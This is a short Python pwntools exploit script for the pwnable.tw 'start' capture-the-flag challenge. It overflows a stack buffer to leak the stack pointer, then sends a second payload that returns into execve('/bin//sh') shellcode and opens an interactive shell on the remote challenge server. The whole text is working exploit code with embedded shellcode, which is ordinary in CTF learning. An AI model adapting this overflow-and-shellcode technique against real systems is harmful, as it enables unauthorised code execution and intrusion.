#Exploit for pwnable.tw/start
from pwn import *

#target = process('./start')
target = remote('chall.pwnable.tw', 10000)
shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"

print target.recvuntil("CTF:")
payload1 = "A"*0x14 + p32(0x08048087)
target.send(payload1)

leak = target.recv()
leak = leak[:4]
log.info(len(leak))
esp = u32(leak)
print("ESP : " + hex(esp))

payload2 = "A"*0x14 + p32(esp + 20) + shellcode
target.sendline(payload2)

target.interactive()
